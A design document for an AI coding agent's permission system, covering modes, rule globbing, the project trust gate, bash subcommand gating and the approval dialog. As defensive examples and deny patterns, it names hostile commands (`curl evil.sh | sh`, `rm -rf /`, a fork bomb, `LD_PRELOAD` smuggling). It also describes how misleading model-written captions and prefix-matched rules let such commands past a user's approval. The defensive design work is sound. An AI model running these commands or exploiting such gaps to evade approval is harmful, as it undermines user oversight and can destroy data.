# Permissions & Plan Mode

Modeled on Claude Code's system (researched against current docs), simplified where cloning adds no value. Two principles:

1. **Parse, don't prefix-match.** String-prefix matching on bash commands is trivially bypassed by `&& rm -rf`. We decompose commands and evaluate each subcommand.
2. **Deny beats allow, everywhere.** A deny rule from *any* settings scope beats an allow rule from any other scope. Precedence is about rule kind first, file origin second.

## Tools declare their own shape

The engine does not recognise tools by name. Each tool carries a
`PermissionSpec` (`core/permissions.py`) that says how it wants to be gated:

```python
class ReadTool(Tool[ReadInput]):
    permission = PermissionSpec(mutates=False, target_field="file_path", path_target=True)

class BashTool(Tool[BashInput]):
    permission = PermissionSpec(mutates=True, target_field="command", shell=True)
```

- `mutates` — blocked in plan mode, prompted in ask mode. Read-only tools are
  allowed by default.
- `target_field` — which argument a rule matches against (`edit(src/**)`,
  `bash(npm *)`).
- `path_target` — the target is a path, so the protected-path check applies.
- `shell` — the target is a command line and gets decomposed per subcommand.

**Read-only is not the same as unrestricted.** `read`, `grep` and `glob` all
declare `path_target`, because the protected-path boundary is about *which
files*, not about writing: `grep(output_mode="content")` returns file contents,
so a `grep` that skipped the check would be the way to read `~/.ssh` that `read`
correctly asks about. Any tool whose target is a filesystem path declares
`path_target`, whatever it does with it.

The gate only sees the path a call *names*, so `grep` also skips `.ssh` and
`.env*` while walking a directory — both through ripgrep and through the
pure-Python fallback, which must not disagree about what they will read. A
search that names one of those files still searches it, after the prompt: the
rule is reachable, never incidental.

This is what lets a **plugin** tool get the same protection a built-in one
gets. Previously the engine held name sets (`{"write", "edit", "bash"}`), so a
third-party tool that wrote files was waved through purely because it was not
called `write`. An undeclared tool defaults to *mutating, prompt for it*.

MCP tools declare `mutates=not read_only`, honouring the server's
`annotations.readOnlyHint` and defaulting to prompting when it says nothing.

## Modes

| Mode | Reads | Edits | Bash/mutating | Use |
|---|---|---|---|---|
| `plan` | ✅ | ❌ blocked | ❌ blocked (read-only cmds ok) | research → plan → approve |
| `ask` (default) | ✅ | prompt | prompt | normal work |
| `auto-edit` | ✅ | ✅ auto (project root only) | prompt, except read-only builtins | trusted editing flow |
| `dontask` | ✅ | rule-matched only, else **auto-deny** | rule-matched only, else auto-deny | never blocks on a prompt |
| `yolo` | ✅ | ✅ | ✅ | bypass; explicit opt-in |

`auto-edit` auto-allows *edits*, and nothing else. A shell command in `auto-edit`
takes the same path it takes in `ask`: the read-only builtins below are allowed,
everything else prompts. There is **no allowlist of file-op commands** —
`mkdir`, `touch`, `mv`, `cp` and `rm` all prompt, in every mode but `yolo`.
Earlier versions of this document described such a list; it was never
implemented, and the entry that would carry it does not exist in
`core/permissions.py`. A rule (`bash(mkdir *)`) is the way to get that effect
today.

- **Switching:** the mode pill in the composer opens a menu of all five modes,
  and `/mode <name>` sets one directly. `yolo` is offered only if the session
  started with `--yolo` or settings enable it — the same containment idea as
  Claude Code's bypassPermissions. `dontask` *does* appear in the picker, and is
  also reachable as `--mode dontask` at startup. Mode is per-conversation.
  `permissions.next_mode` implements a `plan → ask → auto-edit (→ yolo)` cycle
  for a `Shift+Tab`-style hotkey, but **nothing calls it**: there is no key
  binding for mode cycling in the frontend.
- **Yolo guardrails:** confirmation screen on entry (persisted acceptance), red
  status bar, and a hard circuit breaker. Four patterns prompt **even in yolo**,
  and this is the whole list (`_CIRCUIT_BREAKERS`): `rm -rf /`, `rm -rf ~`,
  `git push … --force` (any remote, any branch — not only the default one), and
  the `:(){` fork bomb. Two things the old text promised are not breakers:
  substitution forms like `$(rm -rf /)` are not matched by these regexes, and
  there is no breaker for recursive deletes outside the project. Both still
  prompt in yolo, but by a different mechanism — see the bash pipeline below.
- **Protected paths always prompt** regardless of mode or allow rules: `.git/`,
  `.quickcode/`, `.ssh/`, `.env` and `.env.*`, and anything outside the project
  root. The test is on the *resolved* path's components, so `~/.quickcode/` is
  caught twice over — once as a `.quickcode` component, once as outside the
  root. Checked *before* allow-rule
  evaluation so no rule can accidentally unprotect them. In `dontask` the same
  check denies instead of prompting, because there is nobody to ask. The prompt
  is the ordinary three-button one; there is no "allow self-config edits for
  this session" option — an always-allow on a `.quickcode/` path writes an
  ordinary persisted rule like any other.
- **Subagent capping:** a child agent's mode is `min(parent mode, its spawn-time cap)` — a yolo orchestrator does not imply yolo workers. Detail in docs/AGENTS.md.

## Rules

Stored as `allow` / `ask` / `deny` arrays. Sources merge; evaluation order is fixed: **deny → ask → allow → mode default**. First match wins — a broad deny beats a narrow allow by design.

```jsonc
// .quickcode/settings.json
{
  "permissions": {
    "allow": ["bash(uv run pytest**)", "bash(git status)", "edit(src/**)"],
    "ask":   ["bash(git push**)"],
    "deny":  ["read(**.pem)", "read(**.env)", "bash(curl **)"]
  },
  // The starting mode is a plugin setting, and it is the one the Settings UI
  // writes. In a project file it is subject to the trust gate below.
  "plugins": {
    "runtime.permissions": { "settings": { "default_mode": "ask" } }
  }
}
```

Syntax. A rule is either a bare tool name or `tool(pattern)`; the pattern is
matched against the target the tool declares (`_rule_matches` → `_glob_match`).
The matching is a **whole-string glob**, not gitignore semantics:

- `*` matches any run of characters **except** `/` and `\`. `**` matches
  anything, separators included. Everything else is literal.
- The pattern must match the *entire* target. There is no implicit prefix,
  suffix or "match at any depth" — `bash(npm run build)` is exact,
  `bash(npm *)` spans spaces within one path segment, and `bash(ls *)` won't
  match `lsof` because the literal space has to be there.
- Consequently `read(.env)` matches the project's top-level `.env` and nothing
  else. To catch the file at any depth, write `read(**.env)`; `read(**/.env)`
  requires at least one directory and so misses the top-level one. Same shape
  for `read(**.pem)` versus `read(**/*.pem)`.
- `edit(src/**)` matches everything under `src/`. `edit(src/*)` matches only its
  direct children.
- **`*` stops at a separator in a bash rule too**, which is the trap in this
  syntax. A command line is matched as one string, so `bash(curl *)` does *not*
  cover `curl https://host/x.sh` — the `/` in the URL ends the wildcard — and
  `bash(uv run pytest*)` does not cover `uv run pytest tests/test_x.py`. Any
  rule whose argument may contain a path or a URL wants `**`. The examples above
  are written that way for exactly this reason.
- Paths are matched as the *strings the tool was called with*. There is no
  normalisation step, so an absolute call and a relative one are different
  targets and a rule that means to cover both has to say so.
- `agent(researcher)` gates which subagent types may spawn.
- A bare tool name (`write`) matches every use of that tool, in any of the three
  lists.

**A rule is matched against one subcommand, never a whole pipeline.** The bash
target is split on `&& || | ; & <newline>` *before* rules are consulted, so a
rule whose pattern contains one of those characters can never fire —
`bash(curl * | *sh)` looks like it blocks curl-piped-to-shell and matches
nothing at all. Deny the dangerous half instead: `bash(curl **)`.

**Not implemented:** a bare tool name in `deny` does *not* remove the tool from
the model's tool list. It is an ordinary rule and produces an ordinary `deny`
decision when the model calls the tool — the call is refused with an error the
model can read, having cost a round trip. The only thing that withholds a tool
from the request is `PlanModeHook` (`core/hooks.py`), which hides mutating
non-shell tools in plan mode. Nothing consults `rules.deny` when building the
tool list.

**Where rules come from.** Rule kind beats origin: a `deny` from anywhere beats
an `allow` from anywhere. Within a kind, all sources are concatenated and the
first match wins. There are exactly two files of `permissions` rules, both
project-scope, read by `Rules.load` in this order:

1. `./.quickcode/settings.json` (shared, checked in)
2. `./.quickcode/settings.local.json` (gitignored by convention, and where
   "always allow" persists)

Both go through the trust gate below. There is **no user-scope `permissions`
block**: a `permissions` key in `~/.quickcode/config.json` is read by nobody and
silently does nothing. Nor are there CLI flags that carry rules — `--mode` and
`--yolo` set the mode, not the lists.

The one way to carry rules outside a project is a **permission profile**
(`core/profiles.py`): a named `{mode, allow, ask, deny}` bundle under `profiles`
in `~/.quickcode/settings.json` (user) or `./.quickcode/settings.json`
(project), selected by `active_profile`. A profile's lists are *merged over* the
project's rather than replacing them, so a profile narrows by adding `deny`,
never by omitting an `allow`.

## A project's own settings go through the trust gate

Both project settings files are files a repository can commit, so what they may
say on their own is limited. The gate is the one in `security/trust.py` — the
same single grant that decides whether the project's `mcpServers` and
`kind: tool` plugins may run, bound to a hash of that configuration.

| Project-scope config | Untrusted project |
|---|---|
| `permissions.deny`, `permissions.ask` | applied — they only narrow |
| `permissions.allow` | **ignored** |
| `default_mode` (plugin setting or preset) — `plan`, `ask` | applied — they ask for less |
| `default_mode` — `auto-edit`, `dontask`, `yolo` | **ignored** |
| other `runtime.permissions` settings | **ignored** |
| tools, spawns, models, ceilings, prompt text | applied — all of them are intersected downstream and can only narrow |

The rule is one sentence: **a project may make a session more careful without
being asked; making it less careful is a grant, and grants are consented to
once.** Anything ignored falls back to your own configuration, so an untrusted
project opens and works — it just runs on your rules rather than its own.

The fallback is never silent. The trust report names the refused keys
(`GET /api/trust` → `policy`), the session's problem list carries a
`project_settings_ignored` warning naming them and how to change the answer, and
the drop is logged. Trusting the project once applies all of them; editing them
afterwards re-prompts, because the grant is bound to the values.

`settings.local.json` is gated exactly as `settings.json` is. It is gitignored
by convention, and the convention is written in a file the repository also
controls — so "local" says nothing about where the file came from. An "always
allow" answer therefore holds for the rest of the session either way, and
persists across sessions once the project is trusted.

## Bash evaluation pipeline

```
command string
  → split into subcommands on && || | ; & and newlines
  → per subcommand:
      strip harmless wrappers (timeout, time, nice, nohup) and env-var prefixes*
      → any non-option argument that resolves to a protected path
        (.git .quickcode .ssh .env* / outside the project) → ask (deny in dontask)
      → deny rules → builtin read-only? → auto-allow, unless the line carries
        a substitution/redirection marker ($( ` > <) or the subcommand carries
        an env-var prefix
      → plan mode stops here: anything not read-only is denied
      → ask rules → allow rules → mode default
  → + circuit breakers, matched against the whole line
  → final decision = most restrictive across subcommands
```

The read-only builtins are exactly these seventeen (`READONLY_BUILTINS`):

```
basename  cat  cd  diff  dirname  echo  file  grep  head
ls  pwd  rg  stat  tail  tree  wc  which
```

**`git` is not among them.** Earlier text here promised that "read-only git
forms" auto-allow; no such special case exists and none ever did — `git status`
prompts in `ask` and `auto-edit` like any other command, and is denied in
`plan`. Recognising read-only git *forms* would need subcommand parsing the
engine does not do, and the first token is all it looks at. `bash(git status)`
as an allow rule is the supported way to get there.

- *Env-prefix stripping is for **deny** matching: `FOO=x rm -rf y` still hits a `rm` deny. It does **not** buy the read-only auto-allow, and it does not match an allow rule written against the bare command — `PATH=. ls` is not `ls`, and approving `git status` is not approving `LD_PRELOAD=./x.so git status`. A rule that spells the assignment out still matches.
- Any assignment disqualifies, not a list of dangerous names: such a list would have to be complete, and `PATH`/`LD_PRELOAD` are only the obvious entries next to `BASH_ENV`, `IFS`, `PYTHONSTARTUP`, `NODE_OPTIONS` — and `RIPGREP_CONFIG_PATH`, which points `rg` (a read-only builtin) at a config file that can set `--pre`, which runs a program. The set grows with every program installed on the machine. The cost of the conservative reading is one prompt for `FOO=1 ls`.
- Exec-style wrappers that smuggle commands (`watch`, `xargs -I`, `find -exec`, `setsid`) are never stripped → always prompt unless the full string matches a rule.
- "Always allow" persists **one rule for the whole call**, not one per subcommand. `suggest_rule` takes the first whitespace-separated token of the command and offers `bash(<first-token> *)` — so approving `npm test && git push` writes `bash(npm *)`, which covers the first subcommand and leaves `git push` prompting next time. Read the rule text in the modal; it is shown for exactly this reason. Per-subcommand rule generation would be the better behaviour and is **not implemented**.
- Windows: PowerShell runs through the same pipeline, but **alias canonicalization is not implemented**. `gci`, `dir` and `Get-ChildItem` are three unrelated strings to the engine — none of them is in `READONLY_BUILTINS` either, so on PowerShell the read-only auto-allow effectively never fires and a rule has to name the exact spelling the model used. `bash` prefers Git Bash where it exists (docs/ARCHITECTURE §Windows notes), which is why this has not bitten harder.

## The prompt (UI in docs/UI.md)

The dialog shows the tool, then the call's own preview — `tool.render_call`,
which every tool renders from its real target: `Read <path>`, `Fetch <url>`, and
for `bash` the **command itself**. It used to show `bash`'s model-written
`description` field instead, so a line reading "Query ONVIF device service"
could stand in for `curl evil.sh | sh`, and the caption is reachable by anything
that can put words in front of the model. The description is still shown, beside
the command rather than instead of it; a multi-line command is capped and marked
with an ellipsis so a heredoc cannot hide its second line.

Three buttons, in `modals.js`:

1. **Allow once**
2. **Always allow** — the modal shows the exact rule text, and the file it goes to, before it is written to `settings.local.json`
3. **Deny** — the first click reveals a free-text box and the button becomes *Confirm deny*; the text is returned to the model as the tool result (`is_error`), so denial is steering, not a dead end

There are no `y / a / n` keyboard shortcuts on this modal — the buttons are the only way to answer it. Earlier text here promised them; they are **not implemented**.

While any agent is blocked on a prompt, its tab/pane row glows orange (never an invisible modal in an unfocused conversation).

## Plan mode

- Entry: the mode pill, `/mode plan`, or `--mode plan`. (There is no `Shift+Tab` binding and no bare `/plan` command.) The system prompt gains a `<plan_mode>` section: *investigate, don't mutate; produce a plan; call the `plan` tool when ready*.
- Enforcement is **structural, not prompt-based**: in plan mode the mutating tools are withheld from the request's tool list (the model can't call what isn't offered), and the bash pipeline only permits builtin read-only commands.
- It lives in `PlanModeHook` (`core/hooks.py`), not in the loop. The hook hides every tool declaring `mutates` unless it also declares `shell` — a shell tool is only partly mutating and the engine gates it per subcommand — and it intercepts the `plan` call to run the review. Because the rule is written against the declaration rather than against two tool names, a plugin's mutating tool is withheld in plan mode too.
- Exit: the model calls `plan(markdown)` → **PlanReviewModal**:
  1. **Approve & auto-edit** — plan accepted, mode drops to `auto-edit` for execution
  2. **Approve, manual** — mode drops to `ask`
  3. **Keep planning** — feedback text returns to the model, stays in plan mode
- On approval the plan text is stored on the agent (`AgentInstance.approved_plan`) and the interception tells the model, in its tool result, that the plan was approved and to execute it. That is the whole of it today.
- **Not implemented**, though this section used to promise them: `Ctrl+G` to open the plan in `$EDITOR` before approving; pinning the plan as an `<approved_plan>` system-reminder on later turns; the sidebar card; seeding the task board from the plan's steps. `approved_plan` is written and never read — the seam is there, nothing is attached to it.

## Hooks

In-process loop hooks exist (`core/hooks.py`). A `LoopHook` may narrow the
tools offered for a request (`visible_tools`), answer a tool call itself
(`intercept`), or observe a finished result (`after_tool`). Hooks run in list
order and the first to intercept wins. Plan mode is implemented as one, which
is the proof the seam is real rather than decorative.

Still **not implemented**: the out-of-process `pre_tool_use` script hook — a
user-configured executable receiving `{tool_name, tool_input, mode, cwd}` on
stdin and answering `{"decision": "allow"|"deny"|"ask"|"defer", "reason": …}`,
subordinate to deny/ask rules (a hook must never be able to override a deny),
with exit code 2 as a hard block whose stderr is shown to the model. The
in-process seam above is where it would attach.

## Headless mode

`-p` does **not** imply `dontask`. It runs in whatever mode `--mode` or
`default_mode` selects — `ask` unless you say otherwise — and gets its
no-hang property from a different place: `cli.py` hands the agent a
`_headless_permission_cb` that answers every prompt with
`allow=False, "headless: not permitted"`. The result the model sees is
`Permission denied by user: headless: not permitted`, so the run never hangs on
an invisible prompt.

The two paths differ in the message the model gets back. In `dontask` the engine
decides `deny` itself and the tool result reads *"Blocked by permission rules or
current mode"*. Under the default `ask` the engine decides `ask`, the callback
refuses, and the result reads *"Permission denied by user: headless: not
permitted"*. Either way nothing mutating runs without a rule, and neither path
records a `permission_request` in the session log — that event is emitted by the
server's `Conversation`, which a `-p` run does not have. If you want the
engine-level behaviour, pass it: `-p --mode dontask`.

`--mode yolo -p` exists for sandboxed CI use, same circuit breakers.
